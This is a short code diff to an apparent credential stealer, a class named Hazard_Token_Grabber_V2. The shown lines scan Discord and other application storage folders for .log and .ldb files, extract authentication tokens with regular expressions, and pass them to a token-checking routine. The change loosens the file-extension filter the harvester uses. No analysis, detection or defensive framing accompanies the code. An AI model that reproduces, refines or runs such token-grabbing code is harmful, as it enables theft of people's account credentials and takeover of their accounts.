@@ -273,7 +273,7 @@ class Hazard_Token_Grabber_V2(functions):
             if "cord" in path:
                 if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                     for file_name in os.listdir(path):
-                        if file_name[-4:] not in [".log", ".ldb"]:
+                        if file_name[-3:] not in ["log", "ldb"]:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in findall(self.encrypted_regex, line):
@@ -282,7 +282,7 @@ class Hazard_Token_Grabber_V2(functions):
                                 asyncio.run(self.checkToken(token))
             else:
                 for file_name in os.listdir(path):
-                    if file_name[-4:] not in [".log", ".ldb"]:
+                    if file_name[-3:] not in ["log", "ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for regex in (self.regex):
